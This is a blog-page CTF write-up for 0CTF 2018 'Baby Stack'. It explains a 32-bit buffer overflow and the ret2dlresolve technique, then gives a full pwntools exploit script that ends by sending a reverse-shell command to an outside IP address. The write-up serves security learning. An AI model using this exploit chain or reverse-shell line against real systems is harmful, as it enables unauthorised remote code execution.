@@ -1,0 +1,252 @@
+<!doctype html><html lang=en-US dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Exploiting 0CTF 2018 Quals Baby Stack with ret2dlresolve, without an information leak or a supplied libc."><title>0CTF 2018 Quals: Baby Stack</title><link rel=canonical href=https://stevenlin.cc/blog/p/0ctf-2018-quals-baby-stack/><link rel=stylesheet href=/blog/scss/style.min.86591c898bd806857815fbb8c47e8d3fed97c133b78e83d9bfc27b164dd0aa2b.css><meta property='og:title' content="0CTF 2018 Quals: Baby Stack"><meta property='og:description' content="Exploiting 0CTF 2018 Quals Baby Stack with ret2dlresolve, without an information leak or a supplied libc."><meta property='og:url' content='https://stevenlin.cc/blog/p/0ctf-2018-quals-baby-stack/'><meta property='og:site_name' content="Steven Lin's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:tag' content='Pwn'><meta property='article:tag' content='ret2dlresolve'><meta property='article:published_time' content='2018-06-22T23:36:52+08:00'><meta property='article:modified_time' content='2018-06-22T23:36:52+08:00'><meta name=twitter:title content="0CTF 2018 Quals: Baby Stack"><meta name=twitter:description content="Exploiting 0CTF 2018 Quals Baby Stack with ret2dlresolve, without an information leak or a supplied libc."><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/blog/><img src=/blog/img/avatar_hu_12316f02ad07fe88.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>📝</span></figure><div class=site-meta><h1 class=site-name><a href=/blog>Steven Lin's Blog</a></h1><h2 class=site-description>Technical notes, learning logs, and hands-on write-ups</h2></div></header><ol class=menu-social><li><a href=https://github.com/5teven1in target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/blog/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/blog/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/blog/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=i18n-switch><svg class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg>
+<select name=language title=language onchange="window.location.href=this.selectedOptions[0].value"><option value=/blog/zh-tw/p/0ctf-2018-quals-baby-stack/>繁體中文</option><option value=/blog/p/0ctf-2018-quals-baby-stack/ selected>English</option></select></li><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#protection>Protection</a></li><li><a href=#analysis>Analysis</a></li><li><a href=#vulnerability>Vulnerability</a></li><li><a href=#idea>Idea</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#note>Note</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/blog/categories/writeup/ style=background-color:#ecbeef;color:#3b0f3d>Writeup</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/blog/p/0ctf-2018-quals-baby-stack/>0CTF 2018 Quals: Baby Stack</a></h2><h3 class=article-subtitle>Exploiting 0CTF 2018 Quals Baby Stack with ret2dlresolve, without an information leak or a supplied libc.</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2018-06-22T23:36:52+08:00>2018-06-22</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>4 minute read</time></div></footer></div></header><section class=article-content><blockquote><p>Challenge link: <a class=link href=http://dl.0ops.net/2018/babystack.tar.gz target=_blank rel=noopener>babystack</a></p><p>Category: Pwn</p><p>Original writeup: <code>https://ss8651twtw.github.io/blog/writeup/0CTF-2018-Quals:Baby-Stack/</code></p></blockquote><p>Info leak is no longer required to exploit a stack overflow in 2018.</p><p>Enjoy the babystack</p><p>202.120.7.202:6666</p><h2 id=protection><a href=#protection class=header-anchor></a>Protection</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Arch:     i386-32-little
+</span></span><span class=line><span class=cl>RELRO:    Partial RELRO
+</span></span><span class=line><span class=cl>Stack:    No canary found
+</span></span><span class=line><span class=cl>NX:       NX enabled
+</span></span><span class=line><span class=cl>PIE:      No PIE (0x8048000)
+</span></span></code></pre></td></tr></table></div></div><h2 id=analysis><a href=#analysis class=header-anchor></a>Analysis</h2><ul><li><code>pow.py</code></li></ul><p>It is a wrapper of babystack.
+Add proof-of-work and limiting the length of input is <code>0x100</code>; also pipe stdout and stderr to <code>/dev/null</code>.</p><ul><li><code>babystack</code></li></ul><p>Just alarm and read buffer.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>sub_804843B</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [esp+0h] [ebp-28h]
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x40u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nf>alarm</span><span class=p>(</span><span class=mh>0xAu</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>sub_804843B</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=vulnerability><a href=#vulnerability class=header-anchor></a>Vulnerability</h2><p>No canary found and we can read a lot of characters to buf.</p><ul><li><strong>Buffer overflow</strong> in <code>read(0, &amp;buf, 0x40u)</code></li></ul><h2 id=idea><a href=#idea class=header-anchor></a>Idea</h2><ul><li>no output function => cannot do information leak</li><li>no libc provided => guessing function offset maybe hard</li><li>NX enabled => read shell code and jump to execute cannot work</li></ul><p>According to the description, &ldquo;info leak is no longer required&rdquo;, it means that we can use ret2dlresolve skill to pwn it!</p><p>Try to solve by the following steps:</p><ol><li>use rop to read fake data structures and ret2main</li><li>use ret2dlresolve to call <code>system("/bin/sh")</code></li></ol><p>Fake data structures:</p><ul><li><code>Elf32_Rel</code></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/* Relocation table entry without addend (in section of type SHT_REL).  */
+</span></span><span class=line><span class=cl>typedef struct
+</span></span><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>  Elf32_Addr        r_offset;                /* Address */
+</span></span><span class=line><span class=cl>  Elf32_Word        r_info;                  /* Relocation type and symbol index */
+</span></span><span class=line><span class=cl>} Elf32_Rel;
+</span></span></code></pre></td></tr></table></div></div><p><a class=link href=https://code.woboq.org/userspace/glibc/elf/elf.h.html#633 target=_blank rel=noopener>https://code.woboq.org/userspace/glibc/elf/elf.h.html#633</a></p><ul><li><code>Elf32_Sym</code></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/* Symbol table entry.  */
+</span></span><span class=line><span class=cl>typedef struct
+</span></span><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>  Elf32_Word        st_name;                 /* Symbol name (string tbl index) */
+</span></span><span class=line><span class=cl>  Elf32_Addr        st_value;                /* Symbol value */
+</span></span><span class=line><span class=cl>  Elf32_Word        st_size;                 /* Symbol size */
+</span></span><span class=line><span class=cl>  unsigned char     st_info;                 /* Symbol type and binding */
+</span></span><span class=line><span class=cl>  unsigned char     st_other;                /* Symbol visibility */
+</span></span><span class=line><span class=cl>  Elf32_Section     st_shndx;                 /* Section index */
+</span></span><span class=line><span class=cl>} Elf32_Sym;
+</span></span></code></pre></td></tr></table></div></div><p><a class=link href=https://code.woboq.org/userspace/glibc/elf/elf.h.html#518 target=_blank rel=noopener>https://code.woboq.org/userspace/glibc/elf/elf.h.html#518</a></p><p>Working flow about <code>_dl_runtime_resolve</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>     _dl_runtime_resolve(link_map, reloc_arg)
+</span></span><span class=line><span class=cl>                                       +
+</span></span><span class=line><span class=cl>          +-----------+                |
+</span></span><span class=line><span class=cl>          | Elf32_Rel | &lt;--------------+
+</span></span><span class=line><span class=cl>          +-----------+
+</span></span><span class=line><span class=cl>     +--+ | r_offset  |        +-----------+
+</span></span><span class=line><span class=cl>     |    |  r_info   | +----&gt; | Elf32_Sym |
+</span></span><span class=line><span class=cl>     |    +-----------+        +-----------+      +----------+
+</span></span><span class=line><span class=cl>     |      .rel.plt           |  st_name  | +--&gt; | system\0 |
+</span></span><span class=line><span class=cl>     |                         |           |      +----------+
+</span></span><span class=line><span class=cl>     v                         +-----------+        .dynstr
+</span></span><span class=line><span class=cl>+----+-----+                      .dynsym
+</span></span><span class=line><span class=cl>| &lt;system&gt; |
+</span></span><span class=line><span class=cl>+----------+
+</span></span><span class=line><span class=cl>  .got.plt
+</span></span></code></pre></td></tr></table></div></div><ul><li><p>fake <code>Elf32_Rel</code></p><ul><li><code>r_offset</code> writable (after resolving symbol write the actual address of function)</li><li><code>r_info</code> high 24 bits<ul><li><code>(r_info >> 8) * 16</code> point to fake <code>Elf32_Sym</code> (16 is size of <code>Elf32_Sym</code>)</li></ul></li><li><code>r_info</code> low 8 bits<ul><li>must be <code>0x07</code> (R_386_JMP_SLOT)</li></ul></li></ul></li><li><p>fake <code>Elf32_Sym</code></p><ul><li><code>.dynstr + st_name</code> point to <code>system</code> string</li></ul></li></ul><p>Read the fake <code>Elf32_Rel</code>、<code>Elf32_Sym</code> structures and ret2main to call <code>_dl_runtime_resolve</code>.</p><ul><li>use <code>plt0</code></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Disassembly of section .plt:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>080482f0 &lt;read@plt-0x10&gt;:                                             // plt0
+</span></span><span class=line><span class=cl> 80482f0:       ff 35 04 a0 04 08       push   DWORD PTR ds:0x804a004 // push link_map
+</span></span><span class=line><span class=cl> 80482f6:       ff 25 08 a0 04 08       jmp    DWORD PTR ds:0x804a008 // jmp _dl_runtime_resolve
+</span></span></code></pre></td></tr></table></div></div><p>We can calculate the <code>reloc_arg</code> to make <code>.rel.plt + reloc_arg</code> point to our fake structures and jump to <code>plt0</code>, let it resolve symbol to <code>system</code>.</p><p>After resolving the symbol, <code>_dl_runtime_resolve</code> will call the function.</p><h2 id=exploitation><a href=#exploitation class=header-anchor></a>Exploitation</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha256</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># r = process(&#39;./babystack&#39;)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;202.120.7.202&#39;</span><span class=p>,</span> <span class=mi>6666</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>verify</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>xrange</span><span class=p>(</span><span class=mi>2</span> <span class=o>**</span> <span class=mi>32</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>sha256</span><span class=p>(</span><span class=n>data</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>i</span><span class=p>))</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\0\0\0</span><span class=s1>&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p32</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;POW is over&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mf>0.5</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>length</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=n>length</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>plt0</span> <span class=o>=</span> <span class=mh>0x80482f0</span>
+</span></span><span class=line><span class=cl><span class=n>relplt</span> <span class=o>=</span> <span class=mh>0x80482b0</span>
+</span></span><span class=line><span class=cl><span class=n>dynsym</span> <span class=o>=</span> <span class=mh>0x80481cc</span>
+</span></span><span class=line><span class=cl><span class=n>dynstr</span> <span class=o>=</span> <span class=mh>0x804822c</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>main</span> <span class=o>=</span> <span class=mh>0x8048457</span>
+</span></span><span class=line><span class=cl><span class=n>read_plt</span> <span class=o>=</span> <span class=mh>0x8048300</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=mh>0x804a500</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=c1># _dl_runtime_resolve call and reloc_arg</span>
+</span></span><span class=line><span class=cl>        <span class=n>plt0</span><span class=p>,</span> <span class=n>buf</span> <span class=o>-</span> <span class=n>relplt</span><span class=p>,</span> <span class=c1># will resolve system</span>
+</span></span><span class=line><span class=cl>        <span class=mh>0xdeadbeef</span><span class=p>,</span> <span class=c1># return address</span>
+</span></span><span class=line><span class=cl>        <span class=n>buf</span> <span class=o>+</span> <span class=mi>36</span> <span class=c1># parameter &#34;/bin/sh&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=c1># Elf32_Rel</span>
+</span></span><span class=line><span class=cl>        <span class=n>buf</span><span class=p>,</span> <span class=mh>0x7</span> <span class=o>|</span> <span class=p>((</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>12</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>/</span> <span class=mi>16</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>,</span> <span class=mh>0xdeadbeef</span><span class=p>,</span> <span class=c1># 0xdeadbeef is padding</span>
+</span></span><span class=line><span class=cl>        <span class=c1># Elf32_Sym</span>
+</span></span><span class=line><span class=cl>        <span class=n>buf</span> <span class=o>+</span> <span class=mi>28</span> <span class=o>-</span> <span class=n>dynstr</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;system</span><span class=se>\x00\x00</span><span class=s1>&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>verify</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># read data to buf</span>
+</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>44</span> <span class=o>+</span> <span class=n>flat</span><span class=p>(</span><span class=n>read_plt</span><span class=p>,</span> <span class=n>main</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>44</span><span class=p>),</span> <span class=mh>0x40</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=mi>44</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># use ret2dlresolve to call system(&#34;/bin/sh&#34;)</span>
+</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>44</span> <span class=o>+</span> <span class=n>rop</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># make a reverse shell</span>
+</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=s1>&#39;bash -c &#34;bash -i &amp;&gt;/dev/tcp/35.201.141.84/80 0&gt;&amp;1&#34;&#39;</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>flag{return_to_dlresolve_for_warming_up}</code></p><h2 id=note><a href=#note class=header-anchor></a>Note</h2><p><a class=link href=https://www.slideshare.net/AngelBoy1/re2dlresolve target=_blank rel=noopener>https://www.slideshare.net/AngelBoy1/re2dlresolve</a></p><p><a class=link href="https://www.youtube.com/watch?v=wsIvqd9YqTI" target=_blank rel=noopener>https://www.youtube.com/watch?v=wsIvqd9YqTI</a></p></section><footer class=article-footer><section class=article-tags><a href=/blog/tags/ctf/>CTF</a>
+<a href=/blog/tags/pwn/>Pwn</a>
+<a href=/blog/tags/ret2dlresolve/>Ret2dlresolve</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2022 -
+2026 Steven Lin's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.34.2>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
